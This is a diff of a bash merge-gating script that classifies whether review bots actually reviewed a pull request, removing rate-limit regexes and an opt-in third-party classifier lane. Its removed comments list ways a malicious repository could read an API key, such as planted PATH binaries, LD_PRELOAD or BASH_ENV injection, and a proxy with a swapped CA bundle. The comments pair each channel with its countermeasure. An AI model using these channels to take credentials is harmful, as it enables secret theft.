@@ -18,7 +18,7 @@
 #      HEAD_COMMITTED_DATE, and optionally HEAD_PUSH_DATE). The fetch block
 #      itself stays in the markdown call sites — only the per-bot algorithm
 #      lives here. ALL_STATUSES is the legacy commit-statuses API consumed by
-#      Tier E (CodeRabbit free-tier on private repos). ALL_REACTIONS
+#      Tier E (statuses-only bots; no login is mapped today). ALL_REACTIONS
 #      (issue-level reactions JSON array) feeds Tier F — the Codex-only reaction
 #      tier; it is empty for callers that haven't been upgraded to fetch it, and
 #      Tier F no-ops in that case. HEAD_PUSH_DATE (UTC ISO-8601) is the timestamp
@@ -163,28 +163,6 @@
 # resolver itself still needs the operator override (working-tree-path
 # substitution in the dispatcher COMPLETION block) — by design; the resolver
 # can only fix incidents that occur AFTER it lands.
-# The TypeSafe lane's key (see _noul_says_non_review) is UN-EXPORTED here,
-# before the first child this script forks (the git/grep of the self-resolver
-# just below). The value stays in this shell for the one curl that needs it,
-# which reads it from stdin; without this every jq/git/grep/awk the ledger forks
-# -- many resolved through a repo-injectable PATH -- would inherit it in its
-# environment, and a planted one could read it before delegating. The exec below
-# hands it on explicitly, so the re-exec'd copy still sees it.
-#
-# WHAT THIS DELIBERATELY DOES NOT COVER: code already running INSIDE this
-# process. A function imported through the environment (an exported `jq`), a
-# BASH_ENV file, or a DYLD_* injection executes in this shell and reads the key
-# as an ordinary variable; no un-export can help, and no reordering inside this
-# script can either. That is not a hole in the TypeSafe lane. It is the
-# ambient-session residual ADR 0026 (#475) accepts for every credentialed call on
-# the pr-grind path: the key lives in the operator's session environment, so a
-# repo able to inject code into that session reads it from ANY process it
-# reaches, not just this one. Closing it means keeping the key out of the
-# environment altogether — an operator configuration choice, not something a
-# script launched inside that environment can do. Treat further variants of this
-# class (BASH_FUNC_*, BASH_ENV, DYLD_*, LD_PRELOAD) as that residual, not as new
-# findings against this lane.
-export -n TYPESAFE_API_KEY
 if [ "${BUSDRIVER_DISABLE_ACK_SELF_RESOLVE:-0}" != "1" ] && \
    _self_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd -P) && \
    _git_root=$(git rev-parse --show-toplevel 2>/dev/null) && \
@@ -194,10 +172,10 @@ if [ "${BUSDRIVER_DISABLE_ACK_SELF_RESOLVE:-0}" != "1" ] && \
    [ -f "$_git_root/scripts/ack-ledger.sh" ] && \
    { [ "${1:-}" != "kody-ai" ] || grep -qx '# ack-ledger-capability: tier-k2' "$_git_root/scripts/ack-ledger.sh"; } && \
    ! [ "$_self_dir" -ef "$_git_root/scripts" ]; then
-  # /bin/bash, not `bash`: the inline assignment re-exports the key to this
-  # interpreter, so it must not resolve through the inherited (repo-injectable)
-  # PATH. /bin/bash is 3.2 on macOS; this script stays 3.2-compatible.
-  TYPESAFE_API_KEY="${TYPESAFE_API_KEY:-}" exec /bin/bash "$_git_root/scripts/ack-ledger.sh" "$@"
+  # /bin/bash, not `bash`: the interpreter must not resolve through the
+  # inherited (repo-injectable) PATH. /bin/bash is 3.2 on macOS; this script
+  # stays 3.2-compatible.
+  exec /bin/bash "$_git_root/scripts/ack-ledger.sh" "$@"
 fi
 unset _self_dir _git_root _remote
 
@@ -279,13 +257,13 @@ GH_TS_RE='^20[0-9]{2}-(0[1-9]|1[0-2])-(0[1-9]|[12][0-9]|3[01])T([01][0-9]|2[0-3]
 # (non-gating) instead of blocking on a review that will never arrive.
 #
 # This is the same call `ack-ledger.sh` already makes for review objects at
-# Case 1 / Case 1b (`infra_error_re`, `_fresh_rate_limit_notice`) — an infra
-# marker the bot cannot self-clear downgrades rather than staling forever. Those
-# cases live in the downgrade block far below, which the Codex comment branches
+# Case 1 (`infra_error_re`) — an infra marker the bot cannot self-clear
+# downgrades rather than staling forever. That case lives in the downgrade block
+# far below, which the Codex comment branches
 # (added for #690) return long before reaching, so the exemption has to be
 # applied here or the precedent silently does not cover comment-form Codex.
 #
-# START-ANCHORED and notice-specific, exactly as Case 1b is: this filter REMOVES
+# START-ANCHORED and notice-specific: this filter REMOVES
 # evidence from a merge gate, so it must never match findings prose that merely
 # discusses environments. Same reasoning as Tier G's own template anchor.
 #
@@ -477,679 +455,6 @@ _sr_provably_other() {
   [ "$_po_cp" != "$_po_hp" ]
 }
 
-# _fresh_rate_limit_notice — true (0) iff the bot's CANONICAL-LATEST issue comment
-# is a fresh (strictly post-anchor) CodeRabbit rate-limit NOTICE. Single source of
-# truth shared by Tier E's status guard (#294 non-success + #353 success) and the
-# Case 1b downgrade, so a rate-limited bot is classified identically whether it
-# surfaced via a legacy commit-status — in ANY state, since a rate-limited bot may
-# report `success` while saying it never started — or only via issue comments.
-# Self-contained: reads $login,
-# $ALL_COMMENTS, and the push/checks anchor globals.
-#
-# Guards (all must hold) keep this from ever reading findings prose as a notice:
-#   - notice-only regex ($rate_notice_re) — the exact review-limit wording, NOT the
-#     broader review-object infra_error_re (Codex P2s, PR #292).
-#   - canonical-latest only (max createdAt) — an older stale notice can't win while
-#     the bot's current comment is an actionable finding.
-#   - anchor-freshness — the comment must postdate the push that landed HEAD
-#     (HEAD_PUSH_DATE || HEAD_CHECKS_DATE, #269); the same server-stamped,
-#     non-backdatable signals used elsewhere. Fail CLOSED (return 1) when neither
-#     anchor is present — an unanchored notice cannot be proven current.
-# Callers additionally gate on ever_approved==0 (a bot that ever approved is never
-# silently downgraded).
-# Notice signatures. CodeRabbit emits two observed shapes:
-#   (A) "Review limit reached" / "you've reached your PR review limit"   (#292, #353)
-#   (B) "Rate limit exceeded. Please try again by re-requesting a review." (#292)
-#
-# (A) is self-identifying — the wording exists only in the notice.
-#
-# (B) is not: both halves are ordinary prose about rate-limiting code. The head
-# (`rate limit exceeded`) was already dropped as a lone signal — it matched "handle
-# the rate limit exceeded response" (Codex P2, PR #292). The tail ("try again by
-# re-requesting") is likewise ordinary advice. So (B) requires BOTH, body-scoped.
-#
-# ── Why body-scoped, and not tighter ──────────────────────────────────────────────
-# This predicate CANNOT be made exact: prose does not reliably self-identify. So the
-# question is which error to prefer, and the two directions are NOT symmetric.
-#
-#   MISS (notice read as a review)  → HEAD-ack. This IS the #353 fail-open: the
-#     ledger asserts a review that never happened. UNSAFE.
-#   FALSE POSITIVE (finding read as a notice):
-#     - ever_approved==0 → `none`. Both `none` and a HEAD-ack are NON-gating
-#       (skills/pr-grind/SKILL.md: "`stale` and `none` ack values do NOT trigger this
-#       gate"), so the merge outcome is IDENTICAL — only the ledger label differs.
-#     - ever_approved>0  → `stale`. Blocks. Strictly SAFER.
-#   And a false positive cannot bury an actionable finding: unresolved non-outdated
-#   threads exit `stale` at Tier A, far above Tier E (pinned by test 353.13).
-#
-# ⇒ Recall is safety-critical; precision is nearly free. Prefer the looser matcher.
-#
-# Tightening was tried and rejected on evidence. Anchoring (B) to a single callout
-# line ("[!WARNING] Rate limit exceeded…") missed the CANONICAL GitHub alert, whose
-# marker sits on its own line:
-#     > [!WARNING]
-#     > Rate limit exceeded. Please try again by re-requesting a review.
-# — i.e. the tightening reintroduced #353 for the (B) variant to avoid a false
-# positive that is provably benign. Body-scoped greps match either rendering, since
-# each succeeds if ANY line matches. See test 353.14 (multi-line) and 353.10
-# (accepted, benign false positive).
-_NOTICE_SELF_RE='review limit reached|reached your [^.]{0,40}review limit'
-_NOTICE_RETRY_RE='try again by re-requesting'
-_NOTICE_QUOTA_RE='rate.?limit exceeded'
-
-# _body_is_rate_limit_notice <body> — true iff the body is a rate-limit NOTICE.
-# Body-scoped by design (see above): each grep succeeds if ANY line matches, so a
-# notice split across lines — the canonical GitHub alert shape — still pairs.
-_body_is_rate_limit_notice() {
-  printf '%s' "$1" | grep -qiE "$_NOTICE_SELF_RE" && return 0
-  printf '%s' "$1" | grep -qiE "$_NOTICE_RETRY_RE" \
-    && printf '%s' "$1" | grep -qiE "$_NOTICE_QUOTA_RE"
-}
-
-# _STATUS_NONREVIEW_RE / _status_desc_is_non_review <description> — the STATUS
-# channel twin of _body_is_rate_limit_notice above.
-#
-# #353 identified the Tier-E success fail-open and guarded it, but scoped detection
-# to the bot's issue-COMMENT body. A bot can announce the same outcome in the commit
-# status DESCRIPTION instead, posting no comment at all — observed live on
-# chris-yyau/busdriver PR #709, HEAD f11de70b: context=CodeRabbit, state=success,
-# description="Review rate limited", target_url=null, no check-run, and a single
-# walkthrough comment that matches no notice regex. Both comment-scoped predicates
-# returned false and Tier E HEAD-acked a review that never ran, so the merge gate
-# recorded the bot as having reviewed the final head when it had not.
-#
-# `success` on this channel means "the run terminated", NOT "the code was reviewed".
-# Only descriptions that AFFIRMATIVELY report non-performance are demoted here.
-#
-# THE CONTRACT, and its deliberate residual. A status description is free English,
-# so no classifier can be complete; what this one guarantees is a CLOSED list of
-# families:
-#
-#   * capacity/quota tokens naming the reviewer's own budget (rate limited, quota
-#     exceeded, out of quota, at/over capacity, review limit reached);
-#   * the review as subject, with any run of the closed auxiliary/modal set, over
-#     the verbs skipped / aborted / cancelled, a negated (not|never) or yet-to or
-#     unable-to / not-able-to or failed-to start|complete|finish, "review timed out", and the
-#     bare "review failed";
-#   * a NEGATED SUBJECT at the head, over the performance verbs only — "No review
-#     was completed" reports that nothing was reviewed. Anchored to the start and
-#     restricted to start/complete/finish so it cannot invert the skip family:
-#     "Review completed; no review was skipped" says one DID run;
-#   * the review as OBJECT of a denial ("could not start this review") — where the
-#     object must END the clause, so "failed to complete the review summary" is
-#     about the summary and still acks;
-#   * a SUBJECTLESS denial standing clause-initially, which elides its subject and
-#     so inherits the description's topic ("Review started; failed to complete").
-#
-# Anything outside those families ACKS — including an EMPTY description, and
-# including some novel phrasing of non-performance nobody has posted yet. That is
-# the same doctrine both ways: absence of a recognized statement is not evidence
-# the review did not happen, and inventing an over-block class no observation
-# supports would trade one wrong answer for another. `Review failed` is the one
-# ambiguous case resolved toward demotion — on a channel where `success` means only
-# "the run terminated", a description that reports failure is not proof HEAD was
-# reviewed, and a visible stall beats a silent fail-open.
-#
-# OUTSIDE the contract, by construction and after measurement:
-#
-#   * a QUALIFIED subject or object beyond one closed determiner — "The scheduled
-#     nightly review started", "could not complete the full automated security
-#     review". The subject at the HEAD of the description may carry one word from a
-#     closed determiner set (the/a/an/this/that/code/pr); past that, one more
-#     qualifier word is always available and no threshold is defensible;
-#   * a denial introduced by a colon, dash or comma anywhere but the START of the
-#     description — "Nightly job ran: review failed to complete". A description
-#     that OPENS with the review (with or without that one determiner) is covered;
-#     telling the review's own introducer from another subject's mid-string
-#     ("artifacts for review: failed to complete") needs the unbounded count;
-#   * a clause that DENIES and then RECOVERS — "failed to complete after retry but
-#     later completed" demotes on its first half. The adjunct that may follow a
-#     subjectless denial is not required to end the clause, and requiring it to
-#     would drop "Could not start due to quota", a real non-review;
-#   * a NEGATED budget claim, which still demotes — "Review completed; not rate
-#     limited" over-blocks. Deliberate: every normalization that removed the
-#     over-block introduced a fail-OPEN instead.
-#
-# All FOUR are measured, not assumed. Three were implemented and then REMOVED after
-# review found the fix opened a defect in the opposite direction: widening the
-# qualifier run swallowed foreign subjects, narrowing it missed real ones, and
-# deleting negated budget phrases swallowed the verdict they qualified. The fourth
-# — deny-then-recover — is the standing cost of letting an adjunct follow a
-# subjectless denial, and closing it by requiring the denial to end its clause was
-# tried and reverted because it dropped "Could not start due to quota", a real
-# non-review. A status description is free English; a regex over it has no fixed
-# point. Widening this classifier is therefore not automatically an improvement — a
-# change here must show it closes an OBSERVED payload without opening the
-# mirror-image defect, and must land with both fixtures.
-#
-# So: this guard closes the demonstrated fail-open (#709, "Review rate limited")
-# and its structural neighbours, and NOTHING WIDER. A newly observed phrasing is a
-# new case with a new fixture — not evidence this classifier was wrong.
-# Two rules keep this bounded instead of an endless phrase list — each earlier
-# round closed one grammatical form and review found the next.
-#
-# 1. THE SUBJECT DECIDES THE SCOPE, CLAUSE BY CLAUSE. Alternatives that name the
-#    review itself, and the capacity/quota tokens that name the reviewer's own
-#    budget, are matched against the WHOLE description (_STATUS_NONREVIEW_RE): a
-#    trailing clause cannot spoof them, and narrowing would only lose evidence —
-#    "Unable to proceed, review was not started" and "Review unavailable, rate
-#    limit exceeded" are non-reviews however they are punctuated.
-#
-#    Denials with NO subject at all (_STATUS_NONREVIEW_LEAD_RE — bare "couldn't
-#    start", "failed to complete", "yet to be completed") are matched CLAUSE-
-#    INITIALLY, against every clause. A subjectless denial elides its subject and
-#    therefore inherits the description's topic, which is the review: "Review
-#    started; failed to complete" is a failed review wherever the phrase sits. But
-#    a denial that carries its OWN subject is about that subject, not the review —
-#    "Review completed; preview can't start" and "Review completed; generated files
-#    failed to complete" are COMPLETED reviews and must still ack. The clause-
-#    initial anchor is exactly that distinction, and it needs no list of foreign
-#    subjects: anything other than the review supplies its own noun, which pushes
-#    the denial off the start of its clause. The subjectless verb must also END its
-#    clause, because a foreign topic can arrive as the OBJECT instead of the
-#    subject — "unable to complete the reviewer profile update" is about the
-#    profile update, while a bare "failed to complete" has nothing left to be
-#    about except the review. What may follow it is a CLOSED set of adjunct
-#    prepositions ("due to quota", "because of ...", "after ..."): an adjunct
-#    explains the denial, an object replaces its topic.
-#
-#    Clause separators are `;` `.` `!` and `?` — punctuation that ENDS a clause.
-#    Commas, colons and dashes are NOT separators: they INTRODUCE a clause whose
-#    subject sits before them ("preview rendering: failed to complete"), so
-#    splitting there would strip the very subject this pass reads. They are
-#    absorbed as a subject prefix instead, and only when the subject they follow
-#    is the review itself — so "Review: not started" and "Review started - failed
-#    to complete" are read as verdicts about the review, while the
-#    reviewer-profile forms are not.
-#
-#    The asymmetry is deliberate and fail-CLOSED: a budget token appearing only in
-#    a trailing clause demotes. Over-blocking stalls a merge visibly and the
-#    operator can act; under-blocking is the #709 fail-open itself.
-#
-# 2. NON-PERFORMANCE IS STRUCTURAL, NOT LEXICAL. Rather than enumerating
-#    "was skipped" / "has not started" / "couldn't be completed" one phrasing at a
-#    time, the `review ...` alternatives allow a CLOSED set of auxiliary and modal
-#    words between the subject and the verb, and the negated family REQUIRES an
-#    explicit `not` before a CLOSED verb pair (start / complete — a review that
-#    neither started nor finished has not reviewed HEAD). That covers passive,
-#    modal and negated forms uniformly while a bare "Review started" stays a
-#    progress report and acks. The negation token is `not|never`; neither is a
-#    member of the auxiliary set, because negation is mandatory where it is meant
-#    and admitting it everywhere would demote the affirmation "Review was not
-#    skipped".
-#
-# Bare topic words (`quota`, `capacity`, `skipped`) are still NOT alternatives —
-# they occur in descriptions of reviews that DID run ("Review completed within
-# quota"), and matching those trades the fail-open for an equally wrong over-block.
-# Each is pinned as a positive case in tests/test-ack-ledger-status-description.sh.
-#
-# Contractions and the fused `cannot` are expanded before matching (see
-# _status_desc_is_non_review), so only the spelled-out form appears here.
-#
-# Every `review ...` alternative is prefixed with (^|[^[:alnum:]_]) so it cannot
-# match `review` inside a longer word: "preview was skipped" must not demote. The
-# terminal verbs carry the mirror-image suffix ([^[:alnum:]_]|$) for the same
-# reason: without it "not complete" matches inside "was not completely clean",
-# which reports a review that DID run. POSIX bracket form rather than \< or \b so
-# it behaves identically under GNU grep (CI) and BSD grep (macOS).
-_STATUS_NONREVIEW_RE='^no review( was| is| were| has| had| have| been| being| be| got| get| yet| did| does| do| can| could| will| would| shall)* (start(ed)?|complet(e|ed)|finish(ed)?)(([[:space:][:punct:]]|—|–)*$|( *[:;,.!?]| *—| *–| - )|([[:space:][:punct:]]|—|–)+(due|because|owing|after|since|within|for|on|at|by|from|while|per|as|when|until)[^[:alnum:]_])|(^|[^[:alnum:]_])rate[^[:alnum:]_]{0,3}limited|(^|[^[:alnum:]_])rate[^[:alnum:]_]{0,3}limit (exceeded|reached|hit)|quota (exceeded|reached)|out of quota|insufficient quota|at capacity|over capacity|(^|[^[:alnum:]_])review limit reached|skipping review([^[:alnum:]_]|$)|unable to review([^[:alnum:]_]|$)|(^review( *[-:—–]+)?|[^[:alnum:]_]review)( was| is| were| has| had| have| been| being| be| got| get| yet| did| does| do| can| could| will| would| shall)* (skipped|aborted|cancelled|canceled)([^[:alnum:]_]|$)|(^review( *[-:—–]+)?|[^[:alnum:]_]review)( was| is| were| has| had| have| been| being| be| got| get| yet| did| does| do| can| could| will| would| shall)* timed out([^[:alnum:]_]|$)|(^review( *[-:—–]+)?|[^[:alnum:]_]review)( was| is| were| has| had| have| been| being| be| got| get| yet| did| does| do| can| could| will| would| shall)* (not|never)( was| is| were| has| had| have| been| being| be| got| get| yet| did| does| do| can| could| will| would| shall)* (start(ed)?|complet(e|ed)|finish(ed)?)([^[:alnum:]_]|$)|(^review( *[-:—–]+)?|[^[:alnum:]_]review)( was| is| were| has| had| have| been| being| be| got| get| yet| did| does| do| can| could| will| would| shall)* yet to( be)? (start(ed)?|complet(e|ed)|finish(ed)?)([^[:alnum:]_]|$)|(^review( *[-:—–]+)?|[^[:alnum:]_]review)( was| is| were| has| had| have| been| being| be| got| get| yet| did| does| do| can| could| will| would| shall)* (unable|not able) to( be)? (start(ed)?|complet(e|ed)|finish(ed)?)([^[:alnum:]_]|$)|(^review( *[-:—–]+)?|[^[:alnum:]_]review)( was| is| were| has| had| have| been| being| be| got| get| yet| did| does| do| can| could| will| would| shall)* failed to( be)? (start(ed)?|complet(e|ed)|finish(ed)?)([^[:alnum:]_]|$)|(^review( *[-:—–]+)?|[^[:alnum:]_]review)( was| is| were| has| had| have| been| being| be| got| get| yet| did| does| do| can| could| will| would| shall)* failed(([[:space:][:punct:]]|—|–)*$|( *[:;,.!?]| *—| *–| - )|([[:space:][:punct:]]|—|–)+(due|because|owing|after|since|within|for|on|at|by|from|while|per|as|when|until)[^[:alnum:]_])|(not|never)( was| is| were| has| had| have| been| being| be| got| get| yet| did| does| do| can| could| will| would| shall)* (start(ed)?|complet(e|ed)|finish(ed)?)( this| the| a| an)? review(([[:space:][:punct:]]|—|–)*$|( *[:;,.!?]| *—| *–| - )|([[:space:][:punct:]]|—|–)+(due|because|owing|after|since|within|for|on|at|by|from|while|per|as|when|until)[^[:alnum:]_])|unable to( be)? (start(ed)?|complet(e|ed)|finish(ed)?)( this| the| a| an)? review(([[:space:][:punct:]]|—|–)*$|( *[:;,.!?]| *—| *–| - )|([[:space:][:punct:]]|—|–)+(due|because|owing|after|since|within|for|on|at|by|from|while|per|as|when|until)[^[:alnum:]_])|failed to( be)? (start(ed)?|complet(e|ed)|finish(ed)?)( this| the| a| an)? review(([[:space:][:punct:]]|—|–)*$|( *[:;,.!?]| *—| *–| - )|([[:space:][:punct:]]|—|–)+(due|because|owing|after|since|within|for|on|at|by|from|while|per|as|when|until)[^[:alnum:]_])|yet to( be)? (start(ed)?|complet(e|ed)|finish(ed)?)( this| the| a| an)? review(([[:space:][:punct:]]|—|–)*$|( *[:;,.!?]| *—| *–| - )|([[:space:][:punct:]]|—|–)+(due|because|owing|after|since|within|for|on|at|by|from|while|per|as|when|until)[^[:alnum:]_])'
-
-_STATUS_NONREVIEW_LEAD_RE='([[:space:]]*(was|is|were|has|had|have|been|being|be|got|get|yet|did|does|do|can|could|will|would|shall))*[[:space:]]*(not|never)( was| is| were| has| had| have| been| being| be| got| get| yet| did| does| do| can| could| will| would| shall)*[[:space:]]*(start(ed)?|complet(e|ed)|finish(ed)?)(([[:space:][:punct:]]|—|–)*$|( *[:;,.!?]| *—| *–| - )|([[:space:][:punct:]]|—|–)+(due|because|owing|after|since|within|for|on|at|by|from|while|per|as|when|until)[^[:alnum:]_])|([[:space:]]*(was|is|were|has|had|have|been|being|be|got|get|yet|did|does|do|can|could|will|would|shall))*[[:space:]]*yet to( be)?[[:space:]]*(start(ed)?|complet(e|ed)|finish(ed)?)(([[:space:][:punct:]]|—|–)*$|( *[:;,.!?]| *—| *–| - )|([[:space:][:punct:]]|—|–)+(due|because|owing|after|since|within|for|on|at|by|from|while|per|as|when|until)[^[:alnum:]_])|([[:space:]]*(was|is|were|has|had|have|been|being|be|got|get|yet|did|does|do|can|could|will|would|shall))*[[:space:]]*(unable|not able) to( be)?[[:space:]]*(start(ed)?|complet(e|ed)|finish(ed)?)(([[:space:][:punct:]]|—|–)*$|( *[:;,.!?]| *—| *–| - )|([[:space:][:punct:]]|—|–)+(due|because|owing|after|since|within|for|on|at|by|from|while|per|as|when|until)[^[:alnum:]_])|([[:space:]]*(was|is|were|has|had|have|been|being|be|got|get|yet|did|does|do|can|could|will|would|shall))*[[:space:]]*failed to( be)?[[:space:]]*(start(ed)?|complet(e|ed)|finish(ed)?)(([[:space:][:punct:]]|—|–)*$|( *[:;,.!?]| *—| *–| - )|([[:space:][:punct:]]|—|–)+(due|because|owing|after|since|within|for|on|at|by|from|while|per|as|when|until)[^[:alnum:]_])'
-
-# ── TypeSafe / Jev union classifier (operator opt-in, OFF by default) ────────
-# WHY: the contract above says it outright — "A status description is free
-# English; a regex over it has no fixed point." #709 was a live fail-open, and
-# three of the follow-up fixes were implemented and then REVERTED because each
-# closed one grammatical form and opened its mirror image. This asks the SAME
-# question as one typed judgment (a Noul — the probability that the review
-# itself did not run) instead of as a grammar.
-#
-# UNION, NEVER REPLACEMENT. It is consulted at exactly ONE point: after all
-# three regex passes have already concluded "this is a real verdict" (the ack
-# default). It can therefore only ADD demotes, never lift one the regex found,
-# so the blocking set stays strictly >= the regex-only script's. Turning it on
-# creates no new bypass. The regex STAYS; retiring it is a separate decision
-# that needs more evidence than the current fixture set supports.
-#
-# FAILS CLOSED ONCE ENABLED: a transport error, a non-200, an unparseable body,
-# or a missing `curl` all return 2 (NO JUDGMENT), and the Tier E caller turns
-# that into `stale` — an errored matcher has not proven the status is a verdict
-# any more than an unreadable one has. It is deliberately NOT folded into the
-# demote (0): a demote maps to `none` for a bot that never approved, and `none`
-# is non-gating, so "demote on error" was a fail-closed claim the gate did not
-# honour. An over-block stalls a merge visibly and the operator can act;
-# under-blocking is the #709 fail-open itself. (The regex passes' own
-# `grep rc>=2 -> return 0` branches predate this lane and are unchanged.)
-# (`curl` is a NEW dependency for this script — jq was already hard-required,
-# curl was not — and it is reached only on the opted-in path, where its absence
-# blocks.)
-#
-# DISABLED IS TODAY'S BEHAVIOUR, NOT A DEMOTE. Off (the default) returns the
-# regex's own answer untouched and costs no network call. "Off" and "on but
-# broken" are deliberately DIFFERENT terminals: collapsing them would make every
-# un-opted-in repo start demoting the moment this function existed.
-#
-# CONSENT IS AUTHENTICATED BY LOCATION, never by a repo-writable value (ADR 0012
-# / #325): the enable switch is read ONLY from <home>/.claude/busdriver.json,
-# and <home> comes from the PASSWORD DATABASE, not $HOME. Reading $HOME was the
-# same defect one layer up from the .curlrc one below — a value the repo can
-# set, trusted as if it could not. A committed settings.json `env` block sets
-# HOME, so pointing it at the checkout made an in-repo .claude/busdriver.json
-# satisfy the one check whose entire purpose was to be unreachable from the
-# repo: the repo could turn its own lane on and start shipping its status text
-# to a third party. This script, unlike a hook, does not run behind
-# sanitized-gate.sh, so nothing else strips it. Same lookup and same pinned PATH
-# as skills/litmus/scripts/lib/iteration-history.sh. An unresolvable home leaves
-# consent unproven, so the lane stays OFF — which grants nothing.
-# The env var below is a KILL switch ONLY: it
-# can turn the lane OFF (restoring regex-only behaviour, which grants nothing),
-# and there is deliberately no env spelling that turns it ON.
-#
-# THE ENDPOINT IS PINNED HERE — AND THAT ALONE IS NOT ENOUGH, which the review
-# caught twice. Pinning the URL in this script says nothing about where curl
-# actually sends the request. A `.curlrc` reached through CURL_HOME was the
-# first channel (closed by -q below); `https_proxy` together with a repo-supplied
-# CURL_CA_BUNDLE/SSL_CERT_FILE is the second, and it discloses this
-# Authorization header to a TLS-intercepting proxy on a request that still looks
-# pinned from in here. Enumerating those variable names is the phrase-list
-# treadmill this whole file exists to escape, so the answer is an ALLOWLIST, not
-# a denylist: every curl below runs under `env -i PATH=... HOME=/nonexistent`
-# and sees nothing it was not explicitly handed.
-#
-# AND THE PATH IT IS HANDED IS PINNED — the third time the review caught this
-# class. `env -i PATH="$PATH"` stripped the proxy variables and then resolved
-# curl through the very PATH the repo can set, so a checkout-supplied `curl`
-# received the Authorization header with every flag above intact. `env` itself
-# is named absolutely for the same reason. What is deliberately NOT pinned: the
-# jq that builds the request body and parses the response, and the awk that
-# compares. None of them sees the key, and forging this lane's ack/demote answer
-# is something an injected PATH can already do to the entire ledger, whose
-# every tier runs through jq — pinning them here would add nothing that holds.
-# The consent read is different: a forged "enabled" is what STARTS the flow of
-# repo text to a third party, so that jq is pinned -- and launched through
-# `/usr/bin/env -i`, because a pinned PATH does not stop an IMPORTED shell
-# function named `jq` (bash resolves functions before PATH). env execs the
-# binary directly, so no function can answer for it. python3 for the home is
-# launched the same way. The key itself is un-exported at the top of this file
-# and handed to curl on stdin, so none of the unpinned tools sees it either.
-#
-# NOT routed through scripts/lib/resolve-cli.sh: this script is a standalone
-# `bash` subprocess with a documented env contract (see the header), and sourcing
-# a 1900-line resolver to read one boolean would put a merge-path dependency on
-# it for no gain.
-_TYPESAFE_URL='https://api.typesafe.ai/v1/systemone'
-_TYPESAFE_MAX_TIME=8
-# The ONLY path the lane resolves anything it trusts through. PATH is exactly as
-# repo-injectable as HOME (the same committed settings.json `env` block sets
-# it), so every tool that decides consent or touches the key — python3 for the
-# home, jq for the consent read, env and curl for the request — is found here
-# and never on the inherited PATH. Assigned unconditionally, so an exported
-# _TYPESAFE_PATH in the environment is overwritten, not honoured. Same list as
-# skills/litmus/scripts/lib/iteration-history.sh.
-_TYPESAFE_PATH="/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/opt/homebrew/bin"
-_TYPESAFE_HOME=""
-_TYPESAFE_HOME_RESOLVED=0
-_TYPESAFE_THRESHOLD=""
-
-# Resolves the operator's home from the password database INTO _TYPESAFE_HOME,
-# and returns 1 when it cannot be resolved — which leaves consent unproven and
-# the lane off. It ASSIGNS rather than prints so the caller need not run it in a
-# command substitution: the memo below lives in the running shell, and a subshell
-# discards it, forking python3 once per bot status instead of once per process.
-# Do not "simplify" this back into something that prints.
-_typesafe_home() {
-  if [[ "$_TYPESAFE_HOME_RESOLVED" != "1" ]]; then
-    _TYPESAFE_HOME_RESOLVED=1
-    # env -i: the fixed candidate list in _TYPESAFE_PATH and nothing inherited.
-    # No usable interpreter there -> env fails -> empty home -> lane OFF.
-    _TYPESAFE_HOME=$(/usr/bin/env -i PATH="$_TYPESAFE_PATH" python3 -I -c \
-      'import os, pwd; print(pwd.getpwuid(os.getuid()).pw_dir)' 2>/dev/null) \
-      || _TYPESAFE_HOME=""
-  fi
-  [[ -n "$_TYPESAFE_HOME" ]] || return 1
-}
-
-# Sets _TYPESAFE_THRESHOLD and returns 0 when the lane is ON; returns 1 when
-# OFF. It assigns rather than prints for the same reason _typesafe_home does —
-# a caller wrapping it in a command substitution would throw the home memo away.
-#
-# ORDER MATTERS. The two env checks come FIRST because they cost nothing and are
-# exactly what an un-opted-in repo hits. Putting the password-DB lookup ahead of
-# them made every repo fork python3 once per bot status to answer a question the
-# very next line discards.
-_typesafe_optin() {
-  [[ "${ACK_LEDGER_TYPESAFE:-1}" != "0" ]] || return 1
-  [[ -n "${TYPESAFE_API_KEY:-}" ]] || return 1
-  _typesafe_home || return 1
-  [[ -f "$_TYPESAFE_HOME/.claude/busdriver.json" ]] || return 1
-  # A threshold outside (0,1] is rejected rather than clamped: a bad value means
-  # the operator's intent is unknown, and the lane declines instead of guessing.
-  #
-  # 0.8 is MEASURED, not picked. scripts/typesafe-ack-eval.sh replays the 133
-  # fixtures tests/test-ack-ledger-status-description.sh already pins, grouped by
-  # what the regex alone does with them, and scores each on jev-1.13.0. 87 of
-  # them the regex already demotes, and the union cannot double-demote those. 46
-  # are acked: 43 that must KEEP acking, plus the 3 documented under-block
-  # residuals that should demote. The highest score among the 43 is 0.77 ("The
-  # reviewer started, failed to complete"); the lowest among the 3 is 0.86. 0.8
-  # sits in that band and is the lowest threshold that closes all three residuals
-  # at zero cost to the 43. Measured cost of going lower: 1 false demote at 0.7
-  # and at 0.6, 2 at 0.5. Higher is worse, not safer — 0.9 sits on top of the
-  # residuals' own scores and closes only 1 of the 3.
-  #
-  # Re-run the eval before changing it, and take the numbers from ITS table: an
-  # earlier revision of this paragraph carried a fixture count and an ack count
-  # that had never been measured (137 and 127, against an actual 133 and 43), and
-  # priced 0.7 at four false demotes when the current question scores it at one.
-  #
-  # Slurped, and exactly ONE document required: jq streams a multi-document file,
-  # so an enabled object followed by an explicit `enabled:false` would still
-  # emit the first one's threshold. A file that is not a single JSON value is
-  # invalid config, and invalid config leaves the lane OFF.
-  _TYPESAFE_THRESHOLD=$(/usr/bin/env -i PATH="$_TYPESAFE_PATH" jq -ers '
-    select(length == 1) | .[0]
-    | select(.typesafe.ack_ledger.enabled == true)
-    | (.typesafe.ack_ledger.threshold | if . == null then 0.8 else . end)
-    | select(type == "number" and . > 0 and . <= 1)
-  ' "$_TYPESAFE_HOME/.claude/busdriver.json" 2>/dev/null)
-}
-
-# 0 = the judgment says this status reports a review that did not run (demote).
-# 1 = it does not — or the lane is off, in which case the regex's ack stands.
-# 2 = the lane is ON but produced no judgment (transport error, non-200,
-#     malformed body, unevaluable comparison). Kept DISTINCT from 0 because a
-#     demote is not a block: Tier E maps a demote to `none` for a bot that never
-#     approved, and `none` is non-gating, so folding errors into 0 made the
-#     fail-closed terminal non-gating. The Tier E caller turns 2 into `stale`.
-_noul_says_non_review() {
-  local body resp noul model='jev-1.13.0'
-  _typesafe_optin || return 1   # lane OFF (or home unknown) -> today's behaviour
-  # The RAW description, not the contraction-normalized `desc`: that
-  # normalization exists to serve the regex's spelled-out alternatives, and
-  # handing a judgment "can not" where the bot wrote "can't" only removes signal.
-  # A CONCRETE model id, never the `jev-latest` alias: the 0.8 threshold was
-  # measured on jev-1.13.0, and an alias that moves would silently swap the score
